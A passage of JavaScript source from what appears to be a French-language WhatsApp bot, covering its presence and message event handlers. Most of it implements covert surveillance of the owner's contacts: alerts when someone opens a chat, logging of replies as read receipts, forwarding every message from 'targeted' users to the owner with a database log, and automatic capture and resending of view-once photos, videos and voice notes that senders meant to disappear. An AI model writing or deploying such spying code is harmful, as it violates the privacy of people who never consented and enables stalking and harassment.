â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘ ðŸ‘¤ Contact: ${contactInfo}
â•‘ ðŸ“ Nom WA: ${contactName}
â•‘ ðŸ”— Lien: wa.me/${participantNumber}
â•‘ ðŸ• Heure: ${detectTime}
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘ ðŸ’¡ Cette personne a ouvert
â•‘    votre discussion privÃ©e!
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•`;

          try {
            await hani.sendMessage(NOTIFICATION_NUMBER, { text: notificationMsg });
            console.log(`âœ… [PRESENCE] Notification envoyÃ©e vers ${NOTIFICATION_NUMBER}!`);
          } catch (presErr) {
            console.log(`âŒ [PRESENCE] Erreur: ${presErr.message}`);
          }
          console.log(`ðŸ‘ï¸ PrÃ©sence dÃ©tectÃ©e: ${contactName} (${participantNumber}) - ${lastKnownPresence}`);
        }
      }
    } catch (e) {
      // Silencieux en cas d'erreur
      console.log("Erreur presence.update:", e.message);
    }
  });

  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ GESTION DES MESSAGES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  hani.ev.on("messages.upsert", async (m) => {
    try {
      const msg = m.messages?.[0];
      if (!msg || !msg.message) return;

      // ðŸ” VÃ‰RIFICATION: hani.user doit Ãªtre dÃ©fini
      if (!hani.user || !hani.user.id) {
        console.log(`âš ï¸ [MSG] hani.user non dÃ©fini, attente connexion...`);
        return;
      }

      // ðŸ“© LOG: Message reÃ§u
      const fromJid = msg.key?.remoteJid;
      const isFromMe = msg.key?.fromMe;
      console.log(`ðŸ“© [MSG] ReÃ§u de ${fromJid?.split("@")[0]} | fromMe=${isFromMe} | type=${m.type}`);

      const sender = msg.key.participant || msg.key.remoteJid;
      const from = msg.key.remoteJid;
      const botNumber = hani.user.id.split(":")[0] + "@s.whatsapp.net";
      const senderName = msg.pushName || "Inconnu";
      
      console.log(`ðŸ“© [MSG] Traitement: sender=${sender?.split("@")[0]}, senderName=${senderName}, botNumber=${botNumber}`);
      
      // ðŸ†• ENREGISTRER LE CONTACT QUAND QUELQU'UN M'ENVOIE UN MESSAGE
      // Cela permet de sauvegarder son nom WhatsApp pour l'utiliser plus tard
      console.log(`ðŸ“‡ [CONTACT-CHECK] fromMe=${msg.key.fromMe}, sender=${sender?.split("@")[0]}, isGroup=${from?.endsWith("@g.us")}`);
      
      if (!msg.key.fromMe && sender && !from?.endsWith("@g.us")) {
        const contactNumber = sender.split("@")[0];
        const isLIDNumber = isLID(contactNumber);
        console.log(`ðŸ“‡ [CONTACT-CHECK] contactNumber=${contactNumber}, length=${contactNumber?.length}, isLID=${isLIDNumber}`);
        
        // Accepter les numÃ©ros avec au moins 6 chiffres (certains pays ont des numÃ©ros courts)
        if (contactNumber && contactNumber.length >= 6 && !isLIDNumber) {
          if (!contactsDB.has(contactNumber)) {
            contactsDB.set(contactNumber, {
              jid: sender,
              number: contactNumber,
              name: senderName !== "Inconnu" ? senderName : "Inconnu",
              formattedNumber: formatPhoneNumber(contactNumber),
              firstSeen: new Date().toLocaleString("fr-FR"),
              lastSeen: new Date().toLocaleString("fr-FR"),
              messageCount: 1,
              isBlocked: false,
              notes: ""
            });
            console.log(`ðŸ“‡ [CONTACT] âœ… NOUVEAU ENREGISTRÃ‰: ${senderName} (${formatPhoneNumber(contactNumber)})`);
          } else {
            const contact = contactsDB.get(contactNumber);
            if (senderName && senderName !== "Inconnu" && senderName.length > 1) {
              contact.name = senderName; // Mettre Ã  jour le nom
            }
            contact.lastSeen = new Date().toLocaleString("fr-FR");
            contact.messageCount++;
            console.log(`ðŸ“‡ [CONTACT] â™»ï¸ MIS Ã€ JOUR: ${contact.name} (${contact.formattedNumber}) - ${contact.messageCount} messages`);
          }
        } else {
          console.log(`ðŸ“‡ [CONTACT] âš ï¸ IGNORÃ‰: numÃ©ro=${contactNumber}, raison=${isLIDNumber ? 'LID' : 'trop court'}`);
        }
      }
      
      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      // ðŸ”” NOTIFICATION POUR TOUS LES MESSAGES PRIVÃ‰S REÃ‡US
      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      console.log(`ðŸ”” [NOTIF-CHECK] fromMe=${msg.key.fromMe}, spyReplies=${protectionState.spyReplies}, from=${from}, isStatus=${from === "status@broadcast"}, isGroup=${from?.endsWith("@g.us")}`);
      
      if (!msg.key.fromMe && protectionState.spyReplies && from !== "status@broadcast" && !from?.endsWith("@g.us")) {
        console.log(`ðŸ”” [NOTIF] âœ… Conditions remplies! PrÃ©paration notification...`);
        const senderNumber = sender?.split("@")[0];
        
        // âš ï¸ IGNORER LES LID (Linked ID) - ce ne sont pas de vrais numÃ©ros
        if (!isLID(senderNumber)) {
          const formattedPhone = formatPhoneForDisplay(senderNumber);
          const timestamp = Date.now();
          const readTime = new Date(timestamp).toLocaleString("fr-FR");
          
          // Extraire un aperÃ§u du message
          const msgPreview = msg.message?.conversation || 
                            msg.message?.extendedTextMessage?.text ||
                            msg.message?.imageMessage?.caption ||
                            msg.message?.videoMessage?.caption ||
                            (msg.message?.audioMessage ? "ðŸŽµ Vocal" : "") ||
                            (msg.message?.imageMessage ? "ðŸ“· Photo" : "") ||
                            (msg.message?.videoMessage ? "ðŸŽ¬ VidÃ©o" : "") ||
                            (msg.message?.stickerMessage ? "ðŸŽ´ Sticker" : "") ||
                            "ðŸ“© Message";
          
          // VÃ©rifier si c'est une rÃ©ponse Ã  mon message
          const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
          const isReply = !!quotedMsg;
          
          // VÃ©rifier si on a envoyÃ© un message Ã  cette personne rÃ©cemment (dans les 24h)
          const pendingTime = spyData.pendingMessages[from];
          const isFollowUp = pendingTime && (timestamp - pendingTime < 24 * 60 * 60 * 1000);
          
          // Stocker l'info
          spyData.replies.unshift({
            replier: senderNumber,
            replierName: senderName,
            replierJid: from,
            timestamp: timestamp,
            timeStr: readTime,
            preview: msgPreview.slice(0, 50),
            isDirectReply: isReply
          });
          
          // Limiter les entrÃ©es
          if (spyData.replies.length > spyData.maxEntries) {
            spyData.replies = spyData.replies.slice(0, spyData.maxEntries);
          }
          
          // DÃ©terminer le type d'action
          let actionType = "T'A Ã‰CRIT";
          let actionDesc = "ðŸ’¬ _Nouveau message reÃ§u_";
          if (isReply) {
            actionType = "RÃ‰PONDU Ã€ TON MESSAGE";
            actionDesc = "â†©ï¸ _Cette personne a RÃ‰PONDU Ã  ton message!_";
          } else if (isFollowUp) {
            actionType = "T'A RÃ‰PONDU";
            actionDesc = "ðŸ’¡ _Cette personne t'a Ã©crit aprÃ¨s ton message!_";
          }
          
          // ðŸ†• AJOUTER AUX LECTURES CONFIRMÃ‰ES (rÃ©pondre = preuve de lecture!)
          spyData.messageReads.unshift({
            reader: senderNumber,
            readerName: senderName,
            readerJid: from,
            timestamp: timestamp,
            timeStr: readTime,
            confirmedBy: isReply ? "rÃ©ponse" : "message"
          });
          if (spyData.messageReads.length > spyData.maxEntries) {
            spyData.messageReads = spyData.messageReads.slice(0, spyData.maxEntries);
          }
          
          // ðŸ†• AJOUTER AUX PRÃ‰SENCES (Ã©crire = prÃ©sence confirmÃ©e!)
          spyData.presenceDetected.unshift({
            jid: from,
            name: senderName,
            number: senderNumber,
            type: "message",
            timestamp: timestamp,
            timeStr: readTime
          });
          if (spyData.presenceDetected.length > spyData.maxEntries) {
            spyData.presenceDetected = spyData.presenceDetected.slice(0, spyData.maxEntries);
          }
          
          // Utiliser getContactInfo pour avoir le nom enregistrÃ©
          const contactInfo = getContactInfo(sender);
          
          console.log(`ðŸ“¨ [NOTIF] Envoi notification "${actionType}" de ${contactInfo} vers ${NOTIFICATION_NUMBER}`);
          
          try {
            await hani.sendMessage(NOTIFICATION_NUMBER, {
              text: `ðŸ“– â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    *${actionType}* âœ…
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ðŸ‘¤ *Contact:* ${contactInfo}
ðŸ“ *Nom WhatsApp:* ${senderName}
ðŸ“± *NumÃ©ro:* ${formattedPhone}
ðŸ• *Quand:* ${readTime}

ðŸ’¬ *AperÃ§u:* ${msgPreview.slice(0, 40)}${msgPreview.length > 40 ? "..." : ""}

${actionDesc}

ðŸ“ž wa.me/${senderNumber}

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•`
            });
            console.log(`âœ… [NOTIF] Notification envoyÃ©e avec succÃ¨s`);
          } catch (notifErr) {
            console.log(`âŒ [NOTIF] Erreur envoi notification: ${notifErr.message}`);
          }
          
          console.log(`ðŸ“– [MESSAGE REÃ‡U] ${senderName} (${formattedPhone}) - ${actionType}`);
          
          // Supprimer du pending si c'est une rÃ©ponse/suivi
          if (isReply || isFollowUp) {
            delete spyData.pendingMessages[from];
          }
        }
      }
      
      // Enregistrer les messages ENVOYÃ‰S pour tracker les rÃ©ponses
      console.log(`ðŸ“¤ [ENVOI-CHECK] fromMe=${msg.key.fromMe}, from=${from}, isStatus=${from === "status@broadcast"}, isGroup=${from?.endsWith("@g.us")}`);
      
      if (msg.key.fromMe && from !== "status@broadcast" && !from?.endsWith("@g.us")) {
        console.log(`ðŸ“¤ [ENVOI] âœ… Message envoyÃ© vers ${from?.split("@")[0]}`);
        spyData.pendingMessages[from] = Date.now();
        
        // ðŸ†• ENREGISTRER LE CONTACT QUAND J'ENVOIE UN MESSAGE
        // Cela permet de retrouver le nom plus tard
        const recipientNumber = from.split("@")[0];
        const isLIDRecipient = isLID(recipientNumber);
        console.log(`ðŸ“¤ [ENVOI] recipientNumber=${recipientNumber}, length=${recipientNumber?.length}, isLID=${isLIDRecipient}`);
        
        // Accepter les numÃ©ros avec au moins 6 chiffres
        if (recipientNumber && recipientNumber.length >= 6 && !isLIDRecipient) {
          // On ne met pas Ã  jour le nom ici car on ne le connait pas forcÃ©ment
          // Mais on s'assure que le contact existe dans la DB
          if (!contactsDB.has(recipientNumber)) {
            contactsDB.set(recipientNumber, {
              jid: from,
              number: recipientNumber,
              name: "Inconnu",
              formattedNumber: formatPhoneNumber(recipientNumber),
              firstSeen: new Date().toLocaleString("fr-FR"),
              lastSeen: new Date().toLocaleString("fr-FR"),
              messageCount: 1,
              isBlocked: false,
              notes: ""
            });
            console.log(`ðŸ“¤ [CONTACT] âœ… NOUVEAU (envoi): ${formatPhoneNumber(recipientNumber)}`);
          } else {
            const contact = contactsDB.get(recipientNumber);
            contact.lastSeen = new Date().toLocaleString("fr-FR");
            contact.messageCount++;
            console.log(`ðŸ“¤ [CONTACT] â™»ï¸ MIS Ã€ JOUR (envoi): ${contact.name} (${contact.formattedNumber})`);
          }
        } else {
          console.log(`ðŸ“¤ [CONTACT] âš ï¸ IGNORÃ‰ (envoi): numÃ©ro=${recipientNumber}, raison=${isLIDRecipient ? 'LID' : 'trop court'}`);
        }
        
        // ðŸ”„ AUTO-ENVOI VIEWONCE: Quand je rÃ©ponds Ã  quelqu'un qui m'a envoyÃ© un viewonce
        if (protectionState.autoSendViewOnce && pendingViewOnce.has(from)) {
          const storedViewOnce = pendingViewOnce.get(from);
          const timeSince = Date.now() - storedViewOnce.timestamp;
          const maxDelay = 24 * 60 * 60 * 1000; // 24h max
          
          if (timeSince <= maxDelay) {
            // ðŸ†• Utiliser getContactInfo pour avoir le nom complet
            const contactInfo = getContactInfo(storedViewOnce.from);
            console.log(`   ðŸ”„ [AUTO-VIEWONCE] Tu rÃ©ponds Ã  ${contactInfo}, envoi du viewonce...`);
            
            // Envoyer le viewonce Ã  moi-mÃªme
            (async () => {
              try {
                const mediaBuffer = await downloadMediaMessage(
                  { message: { [storedViewOnce.mediaType + "Message"]: storedViewOnce.mediaMsg } },
                  "buffer",
                  {}
                );
                
                const caption = `ðŸ“¸ *ViewOnce de ${contactInfo}*\nðŸ“… ReÃ§u il y a ${Math.round(timeSince / 60000)} min`;
                
                if (storedViewOnce.mediaType === "image") {
                  await hani.sendMessage(botNumber + "@s.whatsapp.net", {
                    image: mediaBuffer,
                    caption: caption
                  });
                } else if (storedViewOnce.mediaType === "video") {
                  await hani.sendMessage(botNumber + "@s.whatsapp.net", {
                    video: mediaBuffer,
                    caption: caption
                  });
                }
                
                console.log(`   âœ… [AUTO-VIEWONCE] ViewOnce envoyÃ© Ã  moi-mÃªme!`);
                pendingViewOnce.delete(from); // Supprimer aprÃ¨s envoi
              } catch (err) {
                console.log(`   âŒ [AUTO-VIEWONCE] Erreur: ${err.message}`);
              }
            })();
          } else {
            pendingViewOnce.delete(from); // Trop vieux, supprimer
          }
        }
      }
      
      // ðŸ” DÃ‰BOGAGE ULTRA-COMPLET: Afficher STRUCTURE de tous les messages
      const msgType = getContentType(msg.message);
      const msgKeys = Object.keys(msg.message || {});
      
      // Log spÃ©cial pour les audios et vocaux (TOUJOURS)
      if (!msg.key.fromMe) {
        const containsAudio = msgKeys.some(k => k.toLowerCase().includes("audio") || k.toLowerCase().includes("ptt"));
        const containsViewOnce = msgKeys.some(k => k.toLowerCase().includes("viewonce"));
        
        if (containsAudio || containsViewOnce) {
          console.log(`\nðŸ”´ ------------------------------------------`);
          console.log(`ðŸ”´ MESSAGE AUDIO/VIEWONCE REÃ‡U - STRUCTURE COMPLÃˆTE:`);
          console.log(`ðŸ”´ De: ${sender?.split("@")[0]} (${senderName})`);
          console.log(`ðŸ”´ Type principal: ${msgType}`);
          console.log(`ðŸ”´ Keys niveau 1: ${msgKeys.join(", ")}`);
          
          // Explorer chaque clÃ©
          for (const key of msgKeys) {
            if (key === "messageContextInfo") continue; // Skip les mÃ©tadonnÃ©es
            const value = msg.message[key];
            if (typeof value === "object" && value !== null) {
              const subKeys = Object.keys(value);
              console.log(`ðŸ”´   ${key} â†’ ${subKeys.join(", ")}`);
              // Si c'est un viewOnce, explorer plus
              if (key.includes("viewOnce") && value.message) {
                const innerKeys = Object.keys(value.message);
                console.log(`ðŸ”´     message â†’ ${innerKeys.join(", ")}`);
                for (const ik of innerKeys) {
                  if (typeof value.message[ik] === "object") {
                    console.log(`ðŸ”´       ${ik} â†’ ${Object.keys(value.message[ik]).join(", ")}`);
                  }
                }
              }
              // Si c'est un audio, montrer les propriÃ©tÃ©s
              if (key.includes("audio") || key.includes("ptt")) {
                console.log(`ðŸ”´     viewOnce: ${value.viewOnce}`);
                console.log(`ðŸ”´     ptt: ${value.ptt}`);
                console.log(`ðŸ”´     seconds: ${value.seconds}`);
                console.log(`ðŸ”´     mimetype: ${value.mimetype}`);
              }
            }
          }
          console.log(`ðŸ”´ ------------------------------------------\n`);
        }
      }
      
      // Log pour TOUS les messages non-texte ou vides
      if (!msg.key.fromMe) {
        // VÃ©rifier TOUS les formats possibles de viewOnce
        const hasViewOnce = msg.message?.viewOnceMessage || msg.message?.viewOnceMessageV2 || msg.message?.viewOnceMessageV2Extension;
        const hasAudioViewOnce = msg.message?.audioMessage?.viewOnce;
        const hasPttViewOnce = msg.message?.pttMessage?.viewOnce;
        
        // VÃ©rifier si c'est un vocal (pour dÃ©bogage)
        const isAudioType = msgType === "audioMessage" || msgType === "pttMessage" || 
                           msgKeys.includes("audioMessage") || msgKeys.includes("pttMessage");
        
        if (hasViewOnce || hasAudioViewOnce || hasPttViewOnce || isAudioType || 
            (msgType !== "extendedTextMessage" && msgType !== "conversation" && msgType !== "reactionMessage")) {
          console.log(`[MSG] [MSG REÃ‡U] Type: ${msgType}`);
          console.log(`   Keys: ${msgKeys.join(", ")}`);
          console.log(`   De: ${sender?.split("@")[0]}`);
          console.log(`   ViewOnce: ${!!hasViewOnce} | AudioViewOnce: ${!!hasAudioViewOnce} | PttViewOnce: ${!!hasPttViewOnce}`);
          
          // DÃ©bogage dÃ©taillÃ© pour viewOnce
          if (hasViewOnce) {
            const voContent = hasViewOnce;
            console.log(`   ViewOnce Content Keys: ${Object.keys(voContent).join(", ")}`);
            if (voContent.message) {
              const innerKeys = Object.keys(voContent.message);
              console.log(`   Inner Message Keys: ${innerKeys.join(", ")}`);
              // Si c'est un audio dans viewOnce
              if (innerKeys.includes("audioMessage") || innerKeys.includes("pttMessage")) {
                console.log(`   [AUDIO] VOCAL VUE UNIQUE DÃ‰TECTÃ‰ dans viewOnce!`);
              }
            }
          }
          
          // DÃ©bogage pour audio/ptt direct
          if (isAudioType) {
            const audio = msg.message?.audioMessage || msg.message?.pttMessage;
            console.log(`   [AUDIO] Audio direct - viewOnce: ${audio?.viewOnce}, ptt: ${audio?.ptt}, seconds: ${audio?.seconds}`);
          }
        }
      }
      
      // ðŸ“‡ ENREGISTRER LE CONTACT DANS LA BASE
      if (!msg.key.fromMe && sender && !sender.endsWith("@g.us")) {
        updateContact(sender, senderName, {
          lastActivity: getContentType(msg.message),
          lastChat: from
        });
      }
      
      // ðŸ¤– AUTO-REPLY: RÃ©ponses automatiques (MySQL UNIQUEMENT)
      if (!msg.key.fromMe) {
        const texte = msg.message?.conversation || msg.message?.extendedTextMessage?.text || "";
        if (texte) {
          try {
            // Utiliser MySQL pour les auto-replies
            const mysqlDB = require("./DataBase/mysql");
            const isGroup = from?.endsWith("@g.us");
            const matchedReply = await mysqlDB.checkAutoReply(texte, isGroup);
            
            if (matchedReply) {
              await hani.sendMessage(from, { text: matchedReply.response }, { quoted: msg });
              console.log(`ðŸ¤– [AUTO-REPLY] DÃ©clencheur: "${matchedReply.trigger_word}" â†’ RÃ©ponse envoyÃ©e (MySQL)`);
            }
          } catch (arErr) {
            console.log(`âš ï¸ [AUTO-REPLY] Erreur: ${arErr.message}`);
          }
        }
      }
      
      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      // ðŸ•µï¸ SURVEILLANCE DES UTILISATEURS CIBLÃ‰S (MySQL UNIQUEMENT)
      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      if (!msg.key.fromMe && sender) {
        try {
          // Charger le module MySQL
          const mysqlDB = require("./DataBase/mysql");
          
          // VÃ©rifier si l'expÃ©diteur est sous surveillance (MySQL)
          const isUnderSurveillance = await mysqlDB.isUnderSurveillance(sender);
          
          if (isUnderSurveillance) {
            const texte = msg.message?.conversation || 
                          msg.message?.extendedTextMessage?.text || 
                          msg.message?.imageMessage?.caption ||
                          msg.message?.videoMessage?.caption ||
                          (msg.message?.audioMessage ? "ðŸŽµ Audio/Vocal" : "") ||
                          (msg.message?.imageMessage ? "ðŸ“· Photo" : "") ||
                          (msg.message?.videoMessage ? "ðŸŽ¬ VidÃ©o" : "") ||
                          (msg.message?.stickerMessage ? "ðŸŽ´ Sticker" : "") ||
                          (msg.message?.documentMessage ? "ðŸ“„ Document" : "") ||
                          (msg.message?.contactMessage ? "ðŸ‘¤ Contact" : "") ||
                          (msg.message?.locationMessage ? "ðŸ“ Localisation" : "") ||
                          "ðŸ“© Message";
            
            const isGroup = from?.endsWith("@g.us");
            let groupName = "PrivÃ©";
            if (isGroup) {
              try {
                const metadata = await hani.groupMetadata(from);
                groupName = metadata.subject || "Groupe";
              } catch (e) {}
            }
            
            const timestamp = new Date().toLocaleString("fr-FR");
            const senderNum = sender.split("@")[0];
            
            // Envoyer notification au propriÃ©taire
            const OWNER = config.NUMERO_OWNER ? 
              config.NUMERO_OWNER.replace(/[^0-9]/g, '') + "@s.whatsapp.net" : 
              hani.user.id.split(":")[0] + "@s.whatsapp.net";
            
            const spyNotif = `
ðŸ•µï¸ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   *ALERTE SURVEILLANCE*
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ðŸ‘¤ *Cible:* @${senderNum}
ðŸ“› *Nom:* ${senderName}
ðŸ“ *Lieu:* ${isGroup ? groupName : "Message privÃ©"}
ðŸ• *Heure:* ${timestamp}

ðŸ’¬ *Message:*
${texte.slice(0, 200)}${texte.length > 200 ? "..." : ""}

ðŸ“ž wa.me/${senderNum}
ðŸ’¾ Source: MySQL
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•`;
            
            await hani.sendMessage(OWNER, { text: spyNotif }, { mentions: [sender] });
            console.log(`ðŸ•µï¸ [SURVEILLANCE] ActivitÃ© dÃ©tectÃ©e de ${senderNum} (MySQL)`);
            
            // Logger l'activitÃ© dans MySQL
            await mysqlDB.logActivity(sender, isGroup ? "group_message" : "private_message", texte.slice(0, 500));
          }
        } catch (survErr) {
          console.log(`âš ï¸ [SURVEILLANCE] Erreur: ${survErr.message}`);
        }
      }
      
      // ðŸ¤– PROTECTION ANTI-BOT DÃ‰SACTIVÃ‰E
      
      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      // ðŸ‘ï¸ INTERCEPTION AUTOMATIQUE DES VUES UNIQUES (Photos/VidÃ©os/Vocaux)
      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      
      // 1. Vues uniques classiques (photos/vidÃ©os/audios)
      const viewOnceContent = msg.message?.viewOnceMessage || msg.message?.viewOnceMessageV2 || msg.message?.viewOnceMessageV2Extension;
      
      // DÃ‰BOGAGE: Afficher tous les types de viewOnce dÃ©tectÃ©s
      if (viewOnceContent) {
        console.log(`ðŸ” [VIEW-ONCE DEBUG] Contenu dÃ©tectÃ©!`);
        console.log(`   Message keys: ${Object.keys(msg.message || {}).join(", ")}`);
        console.log(`   ViewOnce keys: ${Object.keys(viewOnceContent || {}).join(", ")}`);
        if (viewOnceContent.message) {
          console.log(`   Inner message keys: ${Object.keys(viewOnceContent.message || {}).join(", ")}`);
        }
      }
      
      if (viewOnceContent && !msg.key.fromMe) {
        const mediaMsg = viewOnceContent.message;
        const mediaType = Object.keys(mediaMsg || {})[0] || "inconnu";
        
        // DÃ©terminer si c'est un audio/vocal
        const isAudio = mediaType === "audioMessage" || mediaType === "pttMessage";
        const isImage = mediaType === "imageMessage";
        const isVideo = mediaType === "videoMessage";
        
        console.log(`[VIEW] VUE UNIQUE DÃ‰TECTÃ‰E de ${sender.split("@")[0]}`);
        console.log(`   Type: ${mediaType} | Audio: ${isAudio} | Image: ${isImage} | Video: ${isVideo}`);
        
        // VÃ©rifier les protections appropriÃ©es
        const shouldIntercept = isAudio ? protectionState.autoViewOnceAudio : protectionState.autoViewOnce;
        
        if (!shouldIntercept) {
          console.log(`   â­ï¸ Interception dÃ©sactivÃ©e pour ce type`);
        } else {
          console.log(`   [OK] Interception en cours...`);
          
          // Stocker le message complet
          viewOnceMessages.set(msg.key.id, {
            sender: sender,
            from: from,
            type: mediaType.replace("Message", ""),
            date: new Date().toLocaleString("fr-FR"),
            message: msg,
            mediaMessage: mediaMsg
          });
          
          if (viewOnceMessages.size > 50) {
            viewOnceMessages.delete(viewOnceMessages.keys().next().value);
          }
          
          // ðŸ†• STOCKER POUR ENVOI AUTO QUAND JE RÃ‰PONDS
          // (Sera envoyÃ© automatiquement quand je rÃ©ponds Ã  cette personne)
          if (protectionState.autoSendViewOnce) {
            // Pour les messages privÃ©s, from = sender JID
            // Pour les groupes, on utilise le participant
            const senderForStorage = isGroupMsg ? (msg.key.participant || sender) : from;
            pendingViewOnce.set(senderForStorage, {
              from: from, // Le chat oÃ¹ le viewonce a Ã©tÃ© envoyÃ©
              senderName: msg.pushName || sender.split("@")[0],
              mediaType: mediaType,
              mediaMsg: mediaMsg,
              timestamp: Date.now(),
              msgKey: msg.key,
              isGroup: isGroupMsg
            });
            console.log(`   ðŸ“¸ [PENDING] ViewOnce stockÃ© pour envoi auto quand je rÃ©ponds Ã  ${senderForStorage.split("@")[0]}`);
          }
          
          // AUTOMATIQUEMENT tÃ©lÃ©charger et envoyer en privÃ©
          try {
            // CrÃ©er un message formatÃ© pour le tÃ©lÃ©chargement
            const downloadMsg = {
              key: msg.key,
              message: mediaMsg // Utiliser le message interne, pas viewOnceContent
            };
            
            const stream = await downloadMediaMessage(
              downloadMsg,
              "buffer",
              {},
              { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
            );
            
            if (stream && stream.length > 0) {
              console.log(`   ðŸ“¦ Buffer tÃ©lÃ©chargÃ©: ${stream.length} bytes`);
              const media = mediaMsg[mediaType];
              const typeLabel = isAudio ? "ðŸŽ¤ VOCAL" : (isVideo ? "ðŸŽ¬ VIDÃ‰O" : "ðŸ“¸ IMAGE");
              // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
              const contactInfo = getContactInfo(sender);
              const caption = `${typeLabel} *VUE UNIQUE INTERCEPTÃ‰(E)!*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\nðŸ‘¤ *Contact:* ${contactInfo}\nðŸ“ *Nom WA:* ${msg.pushName || "Inconnu"}\nðŸ’¬ *Chat:* ${from.endsWith("@g.us") ? "Groupe" : "PrivÃ©"}\nðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}\n${media?.caption ? `\nðŸ“ *LÃ©gende:* ${media.caption}` : ""}`;
              
              if (isImage) {
                await hani.sendMessage(botNumber, { image: stream, caption });
                console.log(`[OK] Image vue unique envoyÃ©e Ã  Moi-mÃªme`);
              } else if (isVideo) {
                await hani.sendMessage(botNumber, { video: stream, caption });
                console.log(`[OK] VidÃ©o vue unique envoyÃ©e Ã  Moi-mÃªme`);
              } else if (isAudio) {
                // Envoyer le vocal comme PTT
                await hani.sendMessage(botNumber, { 
                  audio: stream, 
                  mimetype: media?.mimetype || "audio/ogg; codecs=opus",
                  ptt: true // Toujours comme vocal
                });
                await hani.sendMessage(botNumber, { text: caption });
                console.log(`[OK] Vocal vue unique envoyÃ© Ã  Moi-mÃªme`);
              }
            } else {
              console.log(`[!] Ã‰chec tÃ©lÃ©chargement vue unique: buffer vide`);
            }
          } catch (e) {
            console.log(`[!] Erreur tÃ©lÃ©chargement vue unique: ${e.message}`);
            // Fallback: essayer avec le message original
            try {
              console.log(`   [...] Tentative fallback avec message original...`);
              const stream2 = await downloadMediaMessage(
                msg,
                "buffer",
                {},
                { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
              );
              if (stream2 && stream2.length > 0) {
                console.log(`   ðŸ“¦ Fallback buffer: ${stream2.length} bytes`);
                const media = mediaMsg[mediaType];
                const typeLabel = isAudio ? "ðŸŽ¤ VOCAL" : (isVideo ? "ðŸŽ¬ VIDÃ‰O" : "ðŸ“¸ IMAGE");
                const caption = `${typeLabel} *VUE UNIQUE INTERCEPTÃ‰(E)!*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\nðŸ‘¤ *De:* ${msg.pushName || sender.split("@")[0]}\nðŸ“± *NumÃ©ro:* ${formatPhoneNumber(sender.split("@")[0])}\nðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}`;
                
                if (isImage) {
                  await hani.sendMessage(botNumber, { image: stream2, caption });
                } else if (isVideo) {
                  await hani.sendMessage(botNumber, { video: stream2, caption });
                } else if (isAudio) {
                  await hani.sendMessage(botNumber, { 
                    audio: stream2, 
                    mimetype: media?.mimetype || "audio/ogg; codecs=opus",
                    ptt: true
                  });
                  await hani.sendMessage(botNumber, { text: caption });
                }
                console.log(`[OK] Vue unique envoyÃ©e (fallback)`);
              }
            } catch (e2) {
              console.log(`[!] Fallback aussi Ã©chouÃ©: ${e2.message}`);
            }
          }
        }
      }
      
      // 2. Vocaux "Ã©coute unique" en format direct (non viewOnce wrapper) - Format alternatif
      const audioMsg = msg.message?.audioMessage;
      const pttMsg = msg.message?.pttMessage; // Format alternatif pour les vocaux
      
      // VÃ©rifier les deux formats possibles de vocal Ã©coute unique (format direct avec viewOnce flag)
      if ((audioMsg?.viewOnce || pttMsg?.viewOnce) && !msg.key.fromMe && protectionState.autoViewOnceAudio) {
        const voiceMsg = audioMsg || pttMsg;
        console.log(`[AUDIO] VOCAL Ã‰COUTE UNIQUE (FORMAT DIRECT) dÃ©tectÃ© de ${sender.split("@")[0]}`);
        console.log(`[AUDIO] VOCAL Ã‰COUTE UNIQUE DÃ‰TECTÃ‰ de ${sender.split("@")[0]}`);
        
        // AUTOMATIQUEMENT tÃ©lÃ©charger et envoyer en privÃ©
        try {
          const stream = await downloadMediaMessage(
            msg,
            "buffer",
            {},
